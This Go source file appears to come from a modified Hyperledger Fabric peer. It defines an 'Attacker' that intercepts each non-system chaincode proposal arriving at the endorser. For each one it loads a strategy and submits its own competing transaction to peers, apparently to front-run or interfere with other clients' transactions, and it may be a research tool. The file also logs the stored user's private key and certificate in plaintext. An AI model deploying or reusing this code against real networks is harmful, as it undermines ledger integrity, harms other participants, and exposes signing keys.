package endorser

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"path/filepath"

	"github.com/hyperledger/fabric-sdk-go/pkg/client/channel"
	"github.com/hyperledger/fabric-sdk-go/pkg/client/channel/invoke"
	"github.com/hyperledger/fabric-sdk-go/pkg/common/providers/core"
	providersFab "github.com/hyperledger/fabric-sdk-go/pkg/common/providers/fab"
	providerMsp "github.com/hyperledger/fabric-sdk-go/pkg/common/providers/msp"
	fabConfig "github.com/hyperledger/fabric-sdk-go/pkg/core/config"
	"github.com/hyperledger/fabric-sdk-go/pkg/core/cryptosuite"
	"github.com/hyperledger/fabric-sdk-go/pkg/core/cryptosuite/bccsp/sw"
	"github.com/hyperledger/fabric-sdk-go/pkg/fab"
	"github.com/hyperledger/fabric-sdk-go/pkg/fabsdk"
	"github.com/hyperledger/fabric-sdk-go/pkg/msp"
	"github.com/hyperledger/fabric/common/flogging"
	"github.com/hyperledger/fabric/core/endorser/request"
	"github.com/pkg/errors"
)

type Attacker struct {
	PackageInfo map[string]string
	TxId        map[string]int
	sdk         *fabsdk.FabricSDK
	id          providerMsp.SigningIdentity
	creator     []byte
	client      *channel.Client
	strategy    *Strategy
	Endorser    *Endorser
}

type Config struct {
	cryptoConfig   core.CryptoSuiteConfig
	endpointConfig providersFab.EndpointConfig
	identityConfig providerMsp.IdentityConfig
}

var logger = flogging.MustGetLogger("attack")
var cfgPath = "/etc/hyperledger/fabric/"
var ccpPath = filepath.Join(cfgPath, "organizations/peerOrganizations/peerConnection/connection.yaml")
var userPath = filepath.Join(cfgPath, "organizations/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp")
var orgName = "Org1"
var channelName = "mychannel"

func (a *Attacker) Prepare(chaincodeBytes []byte) error {
	if a == nil {
		logger.Debug("skipping")
		return nil
	}
	a.PackageInfo["0"] = string(chaincodeBytes)
	return nil
}

func (a *Attacker) LaunchAttack(up *UnpackedProposal, notifier chan struct{}) error {
	defer func() {
		select {
		case notifier <- struct{}{}:
		default:
		}
	}()
	if a == nil {
		logger.Infof("Skipping: attacker is nil")
		return nil
	}
	txId := up.ChannelHeader.TxId
	_, ok := a.TxId[txId]
	if ok {
		logger.Infof("Skipping: my tx")
		return nil
	}

	if a.Endorser.Support.IsSysCC(up.ChaincodeName) {
		logger.Infof("Skipping: a SysCC: %v", up.ChaincodeName)
		return nil
	}
	clientChannelContext := a.sdk.ChannelContext(channelName, fabsdk.WithIdentity(a.id))
	if a.client == nil {
		var err error
		a.client, err = channel.New(clientChannelContext)
		if err != nil {
			return err
		}
	}
	ctx, err := clientChannelContext()
	if err != nil {
		return err
	}
	nonce, err := GetRandomNonce()
	if err != nil {
		return err
	}

	newTxId, err := request.ComputeTxnID(ctx, nonce, a.creator)
	if err != nil {
		return err
	}
	a.TxId[newTxId] = 1

	fcn, args, err := a.strategy.Prepare(up)
	if err != nil {
		return err
	}
	if fcn == "" {
		logger.Infof("No strategy for %v, %v", up.ChaincodeName, string(up.Input.Args[0]))
		return nil
	}

	response, err := request.Execute(
		clientChannelContext,
		channel.Request{ChaincodeID: up.ChaincodeName, Fcn: fcn, Args: args},
		request.WithTargetEndpoints("peer0.org1.example.com", "peer1.org2.example.com"),
		request.WithNonceProvider(nonce),
		request.WithEndorseNotifier(request.Notifier{notifier, false}),
	)

	logger.Infof("result is as follows: %v, %v", string(response.Payload[:]), err)
	return nil
}

func Init() (*Attacker, error) {
	strategy, err := LoadStrategy()
	if err != nil {
		return nil, err
	}
	config, err := getConfigs()
	if err != nil {
		return nil, err
	}
	cryptoSuite, err := sw.GetSuiteByConfig(config.cryptoConfig)
	if err != nil {
		return nil, err
	}
	userStore := providerMsp.UserStore(nil)
	mgr, err := msp.NewIdentityManager(orgName, userStore, cryptoSuite, config.endpointConfig)
	if err != nil {
		return nil, err
	}
	key, cert := loadIdentity()
	id, err := mgr.CreateSigningIdentity(providerMsp.WithPrivateKey(key), providerMsp.WithCert(cert))
	if err != nil {
		return nil, err
	}
	sdk, err := fabsdk.New(fabConfig.FromFile(ccpPath))
	if err != nil {
		return nil, err
	}
	creator, err := id.Serialize()
	if err != nil {
		return nil, err
	}
	return &Attacker{
		make(map[string]string),
		make(map[string]int),
		sdk,
		id,
		creator,
		nil,
		strategy,
		nil,
	}, nil
}

func getConfigs() (*Config, error) {
	configBackend, err := fabConfig.FromFile(ccpPath)()
	if err != nil {
		return nil, err
	}
	cryptoConfig := cryptosuite.ConfigFromBackend(configBackend...)
	endpointConfig, err := fab.ConfigFromBackend(configBackend...)
	if err != nil {
		return nil, err
	}
	identityConfig, err := msp.ConfigFromBackend(configBackend...)
	if err != nil {
		return nil, err
	}
	netConfig := endpointConfig.NetworkConfig()
	if netConfig == nil {
		return nil, fmt.Errorf("fail to initialize netConfig")
	}

	return &Config{
		cryptoConfig, endpointConfig, identityConfig,
	}, nil
}

func loadIdentity() ([]byte, []byte) {
	certPath := filepath.Join(userPath, "signcerts", "cert.pem")
	cert, err := ioutil.ReadFile(filepath.Clean(certPath))
	logger.Infof("att loaded cert: %v", string(cert[:]))
	if err != nil {
		return nil, nil
	}
	keyDir := filepath.Join(userPath, "keystore")
	files, err := ioutil.ReadDir(keyDir)
	if err != nil {
		return nil, nil
	}
	if len(files) != 1 {
		return nil, nil
	}
	keyPath := filepath.Join(keyDir, files[0].Name())
	key, err := ioutil.ReadFile(filepath.Clean(keyPath))
	if err != nil {
		return nil, nil
	}
	logger.Infof("att loaded key: %v", string(key[:]))
	return key, cert
}

func WithNonce(nonce []byte) invoke.TxnHeaderOptsProvider {
	return func() []providersFab.TxnHeaderOpt {
		return []providersFab.TxnHeaderOpt{
			func(opt *providersFab.TxnHeaderOptions) {
				opt.Nonce = nonce
			},
		}
	}
}

const (
	// NonceSize is the default NonceSize
	NonceSize = 24
)

// GetRandomBytes returns len random looking bytes
func GetRandomBytes(len int) ([]byte, error) {
	key := make([]byte, len)

	// TODO: rand could fill less bytes then len
	_, err := rand.Read(key)
	if err != nil {
		return nil, errors.Wrap(err, "error getting random bytes")
	}

	return key, nil
}

// GetRandomNonce returns a random byte array of length NonceSize
func GetRandomNonce() ([]byte, error) {
	return GetRandomBytes(NonceSize)
}

func computeTxnID(ctx providersFab.ClientContext, nonce []byte, creator []byte) (string, error) {
	ho := cryptosuite.GetSHA256Opts()
	h, err := ctx.CryptoSuite().GetHash(ho)
	if err != nil {
		return "", errors.WithMessage(err, "hash function creation failed")
	}
	b := append(nonce, creator...)
	_, err = h.Write(b)
	if err != nil {
		return "", err
	}
	digest := h.Sum(nil)
	id := hex.EncodeToString(digest)
	return id, nil
}
